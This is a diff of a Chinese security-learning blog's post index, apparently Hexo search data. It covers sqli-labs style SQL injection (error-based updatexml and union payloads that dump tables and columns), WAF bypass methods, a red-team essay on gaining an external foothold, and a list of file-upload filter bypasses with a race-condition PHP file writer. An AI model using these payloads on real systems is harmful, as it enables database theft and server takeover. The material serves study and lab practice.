-<h2 id="3、爆数据表名"><a href="#3、爆数据表名" class="headerlink" title="3、爆数据表名"></a>3、爆数据表名</h2><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; and updatexml(1,concat(&#x27;!&#x27;,(select table_name from information_schema.tables where table_schema=database() limit 0,1)),1) --+</span><br></pre></td></tr></table></figure></div>
-
-<h2 id="4、爆字段名"><a href="#4、爆字段名" class="headerlink" title="4、爆字段名"></a>4、爆字段名</h2><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; and updatexml(1,concat(&#x27;!&#x27;,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;表名&#x27;),&#x27;!&#x27;),1) --+</span><br></pre></td></tr></table></figure></div>
-
-<h2 id="5、爆字段数据"><a href="#5、爆字段数据" class="headerlink" title="5、爆字段数据"></a>5、爆字段数据</h2><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; and updatexml(1,concat(&#x27;!&#x27;,(select group_concat(要查的字段名) from 表名),&#x27;!&#x27;),1) --+</span><br></pre></td></tr></table></figure></div>
-
-<h1 id="基于错误的POST型联合注入-11、12关"><a href="#基于错误的POST型联合注入-11、12关" class="headerlink" title="基于错误的POST型联合注入(11、12关)"></a>基于错误的POST型联合注入(11、12关)</h1><h2 id="1、尝试万能密码"><a href="#1、尝试万能密码" class="headerlink" title="1、尝试万能密码"></a><strong>1、尝试万能密码</strong></h2><p>(  <strong>‘</strong>,<strong>“</strong>,<strong>‘)</strong>,<strong>“)</strong>,<strong>‘]</strong>  )or 1&#x3D;1 – q</p>
-<h2 id="2、判断字段数-1"><a href="#2、判断字段数-1" class="headerlink" title="2、判断字段数"></a>2、判断字段数</h2><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;or 1=1 order by 3 -- q</span><br></pre></td></tr></table></figure></div>
-
-<h2 id="3、判断显错位"><a href="#3、判断显错位" class="headerlink" title="3、判断显错位"></a>3、判断显错位</h2><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;union select 1,database() -- q</span><br></pre></td></tr></table></figure></div>
-
-<h2 id="4、判断表名"><a href="#4、判断表名" class="headerlink" title="4、判断表名"></a>4、判断表名</h2><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() -- q</span><br></pre></td></tr></table></figure></div>
-
-<h2 id="5、爆列名"><a href="#5、爆列名" class="headerlink" title="5、爆列名"></a>5、爆列名</h2><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;union select 1,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;要查的表名&#x27; -- q</span><br></pre></td></tr></table></figure></div>
-
-<h2 id="6、爆数据"><a href="#6、爆数据" class="headerlink" title="6、爆数据"></a>6、爆数据</h2><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;union select 1,group_concat(字段名) from 要查的表名 -- q</span><br></pre></td></tr></table></figure></div>
-
-<h1 id="POST变形双报错注入-13、14，17是密码行未过滤"><a href="#POST变形双报错注入-13、14，17是密码行未过滤" class="headerlink" title="POST变形双报错注入(13、14，17是密码行未过滤)"></a>POST变形双报错注入(13、14，17是密码行未过滤)</h1><h2 id="1、万能密码判断是否存在注入点"><a href="#1、万能密码判断是否存在注入点" class="headerlink" title="1、万能密码判断是否存在注入点"></a>1、万能密码判断是否存在注入点</h2><p>(  <strong>‘</strong>,<strong>“</strong>,<strong>‘)</strong>,<strong>“)</strong>,<strong>‘]</strong>  ) or 1&#x3D;1 – q</p>
-<h2 id="2、利用报错信息爆库"><a href="#2、利用报错信息爆库" class="headerlink" title="2、利用报错信息爆库"></a>2、利用报错信息爆库</h2><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;) and updatexml(1,concat(&#x27;!&#x27;,database()),1) -- q</span><br></pre></td></tr></table></figure></div>
-
-<h2 id="3、爆数据表名-1"><a href="#3、爆数据表名-1" class="headerlink" title="3、爆数据表名"></a>3、爆数据表名</h2><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;) and updatexml(1,concat(&#x27;!&#x27;,(select table_name from information_schema.tables where table_schema=database() limit 0,1)),1) -- q</span><br></pre></td></tr></table></figure></div>
-
-<h2 id="4、爆字段名-1"><a href="#4、爆字段名-1" class="headerlink" title="4、爆字段名"></a>4、爆字段名</h2><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;) and updatexml(1,concat(&#x27;!&#x27;,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;表名&#x27;),&#x27;!&#x27;),1) -- q</span><br></pre></td></tr></table></figure></div>
-
-<h2 id="5、爆字段数据-1"><a href="#5、爆字段数据-1" class="headerlink" title="5、爆字段数据"></a>5、爆字段数据</h2><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;) and updatexml(1,concat(&#x27;!&#x27;,(select group_concat(要查的字段名) from 表名),&#x27;!&#x27;),1) -- q</span><br></pre></td></tr></table></figure></div>
-
-<h1 id="抓包修改user-agent"><a href="#抓包修改user-agent" class="headerlink" title="抓包修改user-agent"></a>抓包修改user-agent</h1><p>‘ and updatexml(1,concat(0x7e,(select database()),0x7e),1,1) – q</p>
-]]></content>
-  </entry>
-  <entry>
-    <title>WAF&quot;web应用程序防火墙&quot;</title>
-    <url>/2023/04/19/waf/</url>
-    <content><![CDATA[<h1 id="waf"><a href="#waf" class="headerlink" title="waf"></a>waf</h1><p>是一种用于保护Web应用程序的安全设备，Web应用程序是指通过Web浏览器访问的应用程序。WAF的目的是保护Web应用程序免受黑客、网络上的攻击。</p>
-<h1 id="和防火墙的区别"><a href="#和防火墙的区别" class="headerlink" title="和防火墙的区别"></a>和防火墙的区别</h1><p>和传统防火墙的区别是，它是工作在应用层的防火墙，主要对web请求&#x2F;响应进行防护。</p>
-<h1 id="waf原理"><a href="#waf原理" class="headerlink" title="waf原理"></a>waf原理</h1><p>WAF可以通过对Web应用程序的流量进行过滤和监控，识别并阻止潜在的安全威胁。WAF可以检测Web应用程序中的各种攻击，例如SQL注入、跨站点脚本攻击（XSS）、跨站请求伪造（CSRF）等，并采取相应的措施，例如拦截请求、阻止访问、记录事件等<br>WAF的工作原理通常包括以下几个步骤：</p>
-<p>流量识别：WAF识别来自客户端的请求，并对请求进行分析。WAF可以检查请求头、请求体、Cookie、URL参数等信息，并识别其中的攻击。</p>
-<p>攻击检测：WAF对识别的请求进行攻击检测。WAF可以使用多种技术来检测攻击，例如正则表达式、特征匹配、行为分析等。WAF可以检测多种攻击，包括SQL注入、XSS、CSRF、命令注入等。</p>
-<p>攻击响应：WAF根据检测结果采取相应的措施，例如拦截请求、阻止访问、记录事件等。WAF可以使用多种技术来响应攻击，例如重定向、报错、拦截等。</p>
-<p>日志记录：WAF记录所有请求和响应的详细信息，包括请求头、请求体、响应头、响应体等。WAF可以将日志发送给中央日志管理系统，以便进行分析和审计。</p>
-<h1 id="waf分类"><a href="#waf分类" class="headerlink" title="waf分类"></a>waf分类</h1><p>WAF可以在多个层次对Web应用程序进行保护。常见的WAF包括：</p>
-<p>硬件WAF：硬件WAF通常是一种独立设备，它可以与网络交换机、路由器等设备集成，拦截来自外部网络的流量，并对Web应用程序进行保护。硬件WAF通常具有高性能和低延迟，适用于高流量的Web应用程序。</p>
-<p>软件WAF：软件WAF通常是一种安装在服务器上的应用程序，可以通过修改Web服务器或代理服务器的配置文件实现。软件WAF可以与多种Web服务器和应用程序框架集成，包括Apache、Nginx、IIS等。软件WAF通常具有灵活性和易于配置的优点，适用于多种Web应用程序。</p>
-<p>云WAF：云WAF通常是一种基于云的服务，可以将Web应用程序的流量转发到云端进行处理。云WAF可以提供全球分布的节点，从而提高Web应用程序的可用性和性能。云WAF通常具有弹性扩展、自动升级等优点，适用于高可用性和高性能的Web应用程序。</p>
-<h1 id="WAF的特点"><a href="#WAF的特点" class="headerlink" title="WAF的特点"></a>WAF的特点</h1><p>监测和拦截恶意流量：WAF可以监测流经其设备的所有流量，对恶意流量进行拦截，保护Web应用程序免受各种攻击。</p>
-<p>基于规则的检测：WAF通常采用基于规则的检测技术，通过预定义规则或自定义规则来检测并拦截恶意流量。</p>
-<p>防止漏洞利用：WAF可以检测和拦截各种漏洞利用攻击，如SQL注入、XSS、CSRF、命令注入等。</p>
-<p>安全策略：WAF可以通过安全策略来限制流量的来源、目标和类型，从而实现更精细的流量控制和访问控制。</p>
-<p>高可用性：WAF通常具有高可用性，可以通过多节点部署和负载均衡来实现高可靠性和可扩展性。</p>
-<h1 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h1><p>1、脏数据绕过<br>即传入一段长数据使waf失效，从而实现绕过waf。某些waf处理POST的数据时，只会检测开头的8K，后面选择全部放过。<br>2、高并发绕过<br>对请求进行并发，攻击请求会被负载均衡调度到不同节点，导致某些请求绕过了waf的拦截<br>3、编码绕过<br>对请求数据进行编码，例如url编码，Unicode编码等，如果waf对数据不能有效的解码，而应用后端能够正常解码，就可以绕过waf。<br>例如最常见的url编码，对数据进行二次url编码，waf进行一次解码并不能解析到有效的数据，而后端在进行解码时传入的为有效的恶意数据。<br>4、请求方式转换<br>waf 在对危险字符进行检测的时候，分别为 post 请求和 get 或者其它的请求方式设定了不同的匹配规则，请求被拦截，变 换请求方式有几率能绕过检测</p>
+    <title>web渗透的步骤</title>
+    <url>/2023/04/20/web%E6%B8%97%E9%80%8F%E7%9A%84%E6%AD%A5%E9%AA%A4/</url>
+    <content><![CDATA[<h2 id="1、信息收集"><a href="#1、信息收集" class="headerlink" title="1、信息收集"></a>1、信息收集</h2><p>子域名、C段（同网段不同服务器）、旁注（同服务器不同站点）、目录探测、服务器端口、服务器脚本语言类型及版本、CMS识别、web中间件、web框架、数据库类型及版本、操作系统类型及版本。</p>
+<h2 id="2、漏洞探测发现（手动-amp-自动）"><a href="#2、漏洞探测发现（手动-amp-自动）" class="headerlink" title="2、漏洞探测发现（手动&amp;自动）"></a>2、漏洞探测发现（手动&amp;自动）</h2><p><strong>手动</strong></p>
+<p>去常见的地方去发现top10的漏洞，<strong>比如</strong>：搜索栏，login登录框、发表言论栏，修改信息的地方、与数据库交互的地方、URL地址、上传点等。</p>
+<p><strong>自动</strong></p>
+<p><strong>自动漏洞扫描工具</strong>：AWVS、APPScan、xray、yakit、goby、wpscan等，</p>
+<p>发现中间件漏洞、框架漏洞、CMS漏洞、操作系统漏洞、端口漏洞等，去漏洞库（exploit-db、CVE漏洞库），网上寻找相应的POC进行验证。</p>
+<h2 id="3、漏洞利用"><a href="#3、漏洞利用" class="headerlink" title="3、漏洞利用"></a>3、漏洞利用</h2><p>去网上查找对应的exp和payload进行利用，MSF、各种漏洞库、阿里云漏洞库、知道创宇漏洞库去进行查找利用，最后达到控制服务器的目的。</p>
 ]]></content>
   </entry>
   <entry>
@@ -1072,75 +1141,6 @@
 <h3 id="19、systemctl-status-auditd查看auditd服务的状态"><a href="#19、systemctl-status-auditd查看auditd服务的状态" class="headerlink" title="19、systemctl status auditd	查看auditd服务的状态"></a>19、systemctl status auditd	查看auditd服务的状态</h3><h3 id="20、cd-x2F-var-x2F-log"><a href="#20、cd-x2F-var-x2F-log" class="headerlink" title="20、cd &#x2F;var&#x2F;log"></a>20、cd &#x2F;var&#x2F;log</h3><h3 id="21、ps-ef-grep-audit"><a href="#21、ps-ef-grep-audit" class="headerlink" title="21、ps -ef |grep audit"></a>21、ps -ef |grep audit</h3><h3 id="22、ps-ef-grep-syslog"><a href="#22、ps-ef-grep-syslog" class="headerlink" title="22、ps -ef |grep syslog"></a>22、ps -ef |grep syslog</h3><h3 id="23、service-rsyslog-status查看日志服务状态"><a href="#23、service-rsyslog-status查看日志服务状态" class="headerlink" title="23、service rsyslog status	查看日志服务状态"></a>23、service rsyslog status	查看日志服务状态</h3><h3 id="24、cd-x2F-var-x2F-log-amp-amp-ll查看log目录下的权限"><a href="#24、cd-x2F-var-x2F-log-amp-amp-ll查看log目录下的权限" class="headerlink" title="24、cd &#x2F;var&#x2F;log &amp;&amp; ll	查看log目录下的权限"></a>24、cd &#x2F;var&#x2F;log &amp;&amp; ll	查看log目录下的权限</h3>]]></content>
   </entry>
   <entry>
-    <title>web渗透的步骤</title>
-    <url>/2023/04/20/web%E6%B8%97%E9%80%8F%E7%9A%84%E6%AD%A5%E9%AA%A4/</url>
-    <content><![CDATA[<h2 id="1、信息收集"><a href="#1、信息收集" class="headerlink" title="1、信息收集"></a>1、信息收集</h2><p>子域名、C段（同网段不同服务器）、旁注（同服务器不同站点）、目录探测、服务器端口、服务器脚本语言类型及版本、CMS识别、web中间件、web框架、数据库类型及版本、操作系统类型及版本。</p>
-<h2 id="2、漏洞探测发现（手动-amp-自动）"><a href="#2、漏洞探测发现（手动-amp-自动）" class="headerlink" title="2、漏洞探测发现（手动&amp;自动）"></a>2、漏洞探测发现（手动&amp;自动）</h2><p><strong>手动</strong></p>
-<p>去常见的地方去发现top10的漏洞，<strong>比如</strong>：搜索栏，login登录框、发表言论栏，修改信息的地方、与数据库交互的地方、URL地址、上传点等。</p>
-<p><strong>自动</strong></p>
-<p><strong>自动漏洞扫描工具</strong>：AWVS、APPScan、xray、yakit、goby、wpscan等，</p>
-<p>发现中间件漏洞、框架漏洞、CMS漏洞、操作系统漏洞、端口漏洞等，去漏洞库（exploit-db、CVE漏洞库），网上寻找相应的POC进行验证。</p>
-<h2 id="3、漏洞利用"><a href="#3、漏洞利用" class="headerlink" title="3、漏洞利用"></a>3、漏洞利用</h2><p>去网上查找对应的exp和payload进行利用，MSF、各种漏洞库、阿里云漏洞库、知道创宇漏洞库去进行查找利用，最后达到控制服务器的目的。</p>
-]]></content>
-  </entry>
-  <entry>
-    <title>外网打点</title>
-    <url>/2023/05/12/%E5%A4%96%E7%BD%91%E6%89%93%E7%82%B9/</url>
-    <content><![CDATA[<h2 id="一、打点的基本认识"><a href="#一、打点的基本认识" class="headerlink" title="一、打点的基本认识"></a>一、打点的基本认识</h2><p>做过红队的小伙伴，对打点一定不陌生，这是一项基本技能。</p>
-<p>所谓打点，就是拿到一台机器的 shell。</p>
-<p>打点的一般目的在于利用这台机器，做一个跳板，然后进入内网。</p>
-<p>通常给予充分时间的情况下，打点不是一件很难的事情，因为系统总会有漏洞，就算系统没有漏 洞，人也有漏洞，也可以进行钓鱼，甚至还可以近源，可以花钱买内鬼，一切都只是打点的时间和价格成本与打到点进内网的收益的核算问题，本质就是一道数学题。</p>
-<p>但是以在公司干活的普通员工视角出发，一般项目时间很紧，同时外部资源少，基本能用的东西就是自己的技术。</p>
-<p>对个体而言，这种条件下，个人技术成为了主导因素，也就是说，一个红队人员快速打点能力的强悍与否，成为了一个普通红队和优秀红队的差别所在。</p>
-<p>当然，这里有人会讲，那么有的地方可以给很多时间，或者说自己在实战中，在搞别的站的时候， 不是特定项目中，是有大把时间来进行渗透和攻击的，可以慢慢搞。</p>
-<p>主流的 ctf 赛事解题时间也只有 1-2 天，很多攻防项目也就是一周时间，src 中第一个挖到洞的才给钱，这是客观条件，对大家都是平等的。</p>
-<p>项目就只有几天，这就是游戏规则，是没有道理可讲的，所以还是不要找理由了，因为也没啥用。</p>
-<p>当然，从公司的角度出发，因为项目时间紧，而很大程度上，打点又是个体力活，不涉及太多技术，所以投入信息搜集的人越多，效果一般是更加好的。</p>
-<p>总而言之，打点本身就是一种遍历行为，被攻击的目标就好像一个被围墙保护的城堡，红队要做的事情就是围着围墙转来转去，敲敲打打，看看围墙哪里没修好，哪里空了一块，然后趁机溜进去， 这是一个体力劳动，尤其在面对很多目标的时候，是一项繁重的体力劳动，在下文中会详细解释为什么我反复强调这是一项体力劳动。</p>
-<h2 id="二、打点的基本方法"><a href="#二、打点的基本方法" class="headerlink" title="二、打点的基本方法"></a>二、打点的基本方法</h2><p>基本方法，无非就是信息搜集 –&gt; 找到脆弱资产 –&gt; 漏洞利用→getshell，说起来是很简单的。</p>
-<p>这其中最肝的一个部分，莫过于信息搜集了，纯体力活。</p>
-<p>当然，过程可以用工具相对优化，但我依旧认为是最无脑的一个部分，就像大学生和小学生（高阶和低阶技术人员）一起用计算器（各种工具 fofa goby oneforall 等）来算 1w 道加减乘除题（大量的资产 域名子域名 c 段等）一样，其实是区分不开技术人员的水平的，很多头部的公司早就认识到了这一点，于是在大型攻防演练中，通常是派大量的人来进行资产收集，然后筛选出其中的脆弱资产后把资产给后续的利用人员来进内网快速拿分。</p>
-<p>虽然信息搜集很无脑，但是该说还是得说，这个事情一般有以下几个步骤。</p>
-<p>1、当项目经理告诉了你攻击目标的时候 →得到公司名→上企查查搜公司名→搜出来一堆公司和子公司</p>
-<p>2、拿到这堆公司和子公司的名字→oneforall 来跑一遍→然后得到了一堆子域名</p>
-<p>3、拿到这堆子域名丢给 Eeyes 跑一遍→得到对应子域名对应的 ip 和 c 段信息</p>
-<p>4、将对应 ip 和 c 段丢给 fofa 和 fscan→fofa 能快速得到 c 段资产信息，fscan 能快速扫一遍，顺便帮你打一下常用漏洞</p>
-<p>5、如果你的运气足够好，这个时候 fscan 已经有漏洞爆出来了，可以直接去利用了（小概率事件），但是如果你的运气不好，就要看接下来的第 6 步</p>
-<p>6、刚刚 fofa 得到的资产看一眼，这里可以配合 ehole 的指纹识别来帮助快速筛选，通过筛选敏感资产，例如 shiro，fastjson 等直接能够反序列化 getshell 的资产（小概率事件），如果你的运气好，那么这个时候已经有漏洞了，可以直接利用了，如果你的运气不好，就要看接下来的第 7 步</p>
-<p>7、通过上面一番筛选，时间已经过去很久了，但是目前却毫无进展，其实心里有点郁闷，这个时候就不建议再搞了，先休息一下，调整下心态，不然后续的几天会大幅度降低工作效率，休息好了感觉又可以了，就看看下面的步骤 8 继续吧</p>
-<p>8、其实经过上面的一番筛选，web 这块的基本已经过完了，但是依旧还没有漏洞，说明这个系统平时自查搞的比较多，基本的高危漏洞修复已经完成了，如果是大型攻防演练，那就建议换个目标再用上面的方法轮一次，如果是就某家单位做的定向攻防，就继续看步骤 9 吧</p>
-<p>9、web 的过完了，虽然没有直接能够 rce 的系统，但是我们获得了很多形形色色的登录后台 \ 用户登录 \ 注册 \ 管理员登录等等等等交互类型的资产，这些资产虽然看起来没用，但是我这里要介绍一下攻防演练的三板斧漏洞，运气好的话，这些资产还是能够派上用场的</p>
-<p>三板斧其一 反序列化漏洞：这个不用多说，我最喜欢的漏洞，只要有了这个漏洞，基本一台机子的 shell 就拿到了，看到就眼睛放光，但是可遇不可求，遍地都是 shiro 的时代已经渐渐过去了。</p>
-<p>三板斧其二 文件上传：这个也是老熟人了，一般我会先看看是不是白名单，是白名单的话，就看看有没有文件包含之类的漏洞能组合利用下，如果是黑名单，就把文件上传的姿势对着上传点全部来一遍，看看有没有一个能中，如果能中，那就有了一个 shell（没路径连不上但是确实是 shell），虽然找上传路径也是一个拦路虎，但是至少比传不上去强。</p>
-<p>三板斧其三 sql 注入：这个更加老熟人了，注入之后，低权限，直接 gg，高权限，试试吧，看能不能上 shell。</p>
-<p>至于其他漏洞，攻防演练就那么几天时间，八成是用不上，建议直接放弃，就把上面三个玩精（仅仅就攻防项目来说）。</p>
-<p>10、对各种登录系统尝试弱口令 &#x2F;sql 注入攻击，弱口令能登进去后台就找上传点，sql 注入建议 xray+burp 来测，看到有戏的再上 sqlmap。</p>
-<p>还有一些信息搜集的方法，比如 fofa 搜关键字，title&#x3D;”单位名” 等，这种方法可以自行穿插灵活使用，有时候有奇效，有时候没啥效果，看个人造化了。</p>
-<p>还有些天选之人，直接一个弱口令登云桌面（horizon、vdi 等）然后拿 shell 的，这种属于天赐 shell，不在常规考虑范围之内，但也可以尝试。</p>
-<p>11、弱口令如果爆不出账号密码，就考虑上网盘 \github\sgk\ 泄露公开库搜对应人员的信息，看看好使不</p>
-<p>12、如果还是没有用，就可以开始看公众号 \app\ 小程序的信息</p>
-<p>13、如果还是没有用，就要开始用域传送 \ 备案号 \ip 反查网站 \ssl 证书 \ 用 google 来搜 c 段</p>
-<p>14、如果还是没有用，就用 dirmap\dirsearch 来对可疑的网站进行目录爆破，看看好使不</p>
-<p>15、如果还是没有用，还可以钓鱼，发邮件也是一个体力活</p>
-<p>16、如果还是没有用，拿上设备跟领导申请近源渗透吧</p>
-<p>列了这么多，我就是想说明，虽然信息搜集是一项很重要的工作，是开启后渗透的基础，但这项工作是体力活真的是不争的事实，因为他没有门槛，基本谁都能做，无非就是用工具对着一项项 checklist 不断的去尝试而已。</p>
-<p>因此通常意义上的快速打点，就是比谁先试完所有的 checklist，虽然目前绝大部分工作都是由工 具来完成，整个项目呈一个半自动化的流程，但是仍然架不住资产量的庞大，一个信息收集熟练的人，无非也就是流水线的工人而已，对着巨量的资产不断的用工具筛选而已。</p>
-<p>而一些高端打点技巧玩得好的人，例如电话钓鱼成功率很大的人，钓鱼邮件的撰写和钓鱼样本的开发做的很牛的人，在做这些事情之前，同样需要信息搜集，而能够玩高端技巧的人是不愿意来做信息搜集的，因为他们也是从小白阶段过来的，明白信息搜集这项繁重且技术含量低的工作完全可以找别人来做。</p>
-<p>从公司层面上来讲，要快速打点，就要投入更多的人。从个人层面上来讲，要快速打点，要忍受枯燥的打点过程，然后提升自己的工具使用速度，最好自己能够进行二次开发，把一些半自动化的步骤连接起来，优化现有的步骤，从而进一步提升效率。</p>
-<h2 id="三、打点的技术区分线"><a href="#三、打点的技术区分线" class="headerlink" title="三、打点的技术区分线"></a>三、打点的技术区分线</h2><p>很多时候，找到了一个脆弱资产，自己没利用成功，别人利用成功了，这是很普遍的现象。这就来到了打点的区分线，也就是漏洞利用上。</p>
-<p>利用不成功有很多的原因，比如一台机器明明出网，但是反弹 shell 怎么都弹不回来。比如一台机器能够反弹 shell，但是时不时就会断开。</p>
-<p>比如一台机器能够写入一个内存马，也能够连接上，但是一旦下载或者上传一些较大的文件，就会失败。</p>
-<p>比如一台机器，他能够执行命令，也能反弹 shell，连接也稳定，但是执行特定的命令，就会失败。</p>
-<p>这个时候，一个技术人员就脱离了苦力劳动的阶段，进入到了区分技术的时候了。区分一项工作是苦力劳动还是技术活其实很简单，看是不是谁都能做就行了。</p>
-<p>有的漏洞利用在实战中涉及了一些很原理的东西，对于渗透人员的基本功考察以及联想能力的考查是很强的，因此这个时候技术更好的人就可以凸显优势。</p>
-<p>举一个稍微极端的例子，那就是 ctf，做题是需要理解的，不会就是不会，多久都做不出来，信息搜集只要告诉了基本方法，基本都能做，只是熟练度有差别，信息搜集的效率有差别而已。</p>
-<p>就技术人员个体而言，单纯做一个熟练工，是很容易被淘汰的，应当花更多时间在技术的深化上， 建立自己的竞争壁垒。</p>
-<p>技术的深化，代码能力是基础，进一步对各个系统和漏洞原理的理解，是延申，不断的学习和突破，最后技术就会越来越好，也就会脱离信息搜集的循环，迈入更高的层面。</p>
-<p>不过做项目时候的信息搜集，那是公司项目，是不可避免的，公司花钱请人来就是干这个的。技术栈的突破和延申，是自己的事情。</p>
-<p>我觉得更优的解法就是先集中花一部分时间练习信息收集，然后配合自研的小工具把效率提上去， 练到了一定程度，做项目的时候信息搜集基本都能出东西了，公司这边能跟客户交差了，再把时间花到漏洞的突破和延申上。</p>
-]]></content>
-  </entry>
-  <entry>
     <title>docker搭建靶场常用命令</title>
     <url>/2023/04/19/%E6%90%AD%E5%BB%BA%E9%9D%B6%E5%9C%BAdocker%E5%91%BD%E4%BB%A4/</url>
     <content><![CDATA[<h4 id="启动docker服务-："><a href="#启动docker服务-：" class="headerlink" title="启动docker服务 ："></a>启动docker服务 ：</h4><p> systemctl start docker</p>
@@ -1155,6 +1155,33 @@
 <h4 id="关闭docker："><a href="#关闭docker：" class="headerlink" title="关闭docker："></a>关闭docker：</h4><p>systemctl stop docker</p>
 <h4 id="docker-服务开机自启动命令："><a href="#docker-服务开机自启动命令：" class="headerlink" title="docker 服务开机自启动命令："></a>docker 服务开机自启动命令：</h4><p>systemctl enable docker.service</p>
 <h4 id="关闭docker-服务开机自启动命令："><a href="#关闭docker-服务开机自启动命令：" class="headerlink" title="关闭docker 服务开机自启动命令："></a>关闭docker 服务开机自启动命令：</h4><p>systemctl disable docker.service</p>
+]]></content>
+  </entry>
+  <entry>
+    <title>文件上传绕过方式汇总</title>
+    <url>/2023/04/19/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9A%84%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F/</url>
+    <content><![CDATA[<h1 id="文件上传的绕过方式"><a href="#文件上传的绕过方式" class="headerlink" title="文件上传的绕过方式"></a>文件上传的绕过方式</h1><h2 id="1、前对验证绕过"><a href="#1、前对验证绕过" class="headerlink" title="1、前对验证绕过"></a><strong>1、前对验证绕过</strong></h2><p>F12打开调试器关闭js格式实现绕过</p>
+<h2 id="2、Content-Type方式绕过"><a href="#2、Content-Type方式绕过" class="headerlink" title="2、Content-Type方式绕过"></a><strong>2、Content-Type方式绕过</strong></h2><p>抓包修改Content-Type的数据为它允许的格式，如image&#x2F;jpeg</p>
+<h2 id="3、黑名单绕过（不允许上传php）"><a href="#3、黑名单绕过（不允许上传php）" class="headerlink" title="3、黑名单绕过（不允许上传php）"></a><strong>3、黑名单绕过（不允许上传php）</strong></h2><p>可以上传php5、phtml后缀名，需要到Apache的配置文件，http.conf配置文件里面进行打开相应的配置：</p>
+<p> AddType application&#x2F;x-httpd-php .php .phtml .php5 .pht</p>
+<p>还有就是AllOverride all也要保证是打开的，默认的是none</p>
+<h2 id="4、-htaccess文件绕过"><a href="#4、-htaccess文件绕过" class="headerlink" title="4、.htaccess文件绕过"></a><strong>4、.htaccess文件绕过</strong></h2><p>编辑一个新的.htaccess文件，里面编辑:</p>
+<p>&lt;FilesMatch “4.png”&gt;<br>SetHandler application&#x2F;x-httpd-php</p>
+<p>这串代码的意思是如果文件中有一个4.png（是4.txt改后缀名实现的，不是图片马）的文件，他就会被解析为.php，把这个文件上传上去，然后紧接着上传4.png，这样就会把4.png当成php进行解析。</p>
+<h2 id="5、后缀大小写"><a href="#5、后缀大小写" class="headerlink" title="5、后缀大小写"></a>5、后缀大小写</h2><h2 id="6、文件后缀（空）绕过"><a href="#6、文件后缀（空）绕过" class="headerlink" title="6、文件后缀（空）绕过"></a>6、文件后缀（空）绕过</h2><p>就在php.php后面加个空格就好了。</p>
+<h2 id="7、文件后缀（点绕过）"><a href="#7、文件后缀（点绕过）" class="headerlink" title="7、文件后缀（点绕过）"></a>7、文件后缀（点绕过）</h2><p>就在php.php后面加个点就好了，如php.php.</p>
+<h2 id="8、Windows文件流绕过（-DATA）"><a href="#8、Windows文件流绕过（-DATA）" class="headerlink" title="8、Windows文件流绕过（::$DATA）"></a>8、Windows文件流绕过（::$DATA）</h2><p><strong>在window的时候如果文件名+”::$DATA”会把::$DATA之后的数据当成文件流处理,不会检测后缀名，且保持::$DATA之前的文件名，他的目的就是不检查后缀名</strong>。例如:”test.php::$DATA”Windows会自动去掉末尾的::$DATA变成”test.php”。</p>
+<h2 id="9、文件名双写绕过"><a href="#9、文件名双写绕过" class="headerlink" title="9、文件名双写绕过"></a>9、文件名双写绕过</h2><p>pphphp格式进行绕过</p>
+<h2 id="10、后缀名绕过（点空格点）"><a href="#10、后缀名绕过（点空格点）" class="headerlink" title="10、后缀名绕过（点空格点）"></a>10、后缀名绕过（点空格点）</h2><h2 id="11、GET型00截断、POST型00截断"><a href="#11、GET型00截断、POST型00截断" class="headerlink" title="11、GET型00截断、POST型00截断"></a>11、GET型00截断、POST型00截断</h2><p>（<strong>PHP版本要在5.3.4</strong>以下且<strong>php的magic_quotes_gpc为OFF状态</strong>）</p>
+<h2 id="12、条件竞争"><a href="#12、条件竞争" class="headerlink" title="12、条件竞争"></a>12、条件竞争</h2><p>这里的逻辑是先将文件上传到服务器，然后判断文件后缀是否在白名单里，如果在则重命名，否则删除。这样就存在一个安全问题，那就是我同时上传多个相同文件，在它删除之前访问就可以了。也就是条件竞争问题。可以借助burp的暴力破解模块。</p>
+<p>首先上传一个正常的符合条件的文件进行获取到上传路径，然后就在1.php里面编写内容：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php file_put_contents(&#x27;phpinfoshell.php&#x27;,&#x27;&lt;?php phpinfo();?&gt;&#x27;);?&gt;</span><br></pre></td></tr></table></figure></div>
+
+<p>意思是如果没有找到phpinfoshell.php文件，则创建该文件，内容是：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure></div>
+
+<p>让后通过bp抓包，进行null playd无限跑包，抓上传1.php包跑，跑了之后放包重新抓访问phpinfoshell.php包开始同时跑包，这样就可以通过条件竞争进行有概率的利用漏洞，在被删除之前访问1.php执行里面的file_put_contents函数创建phpinfoshell.php木马文件进行完美绕过。</p>
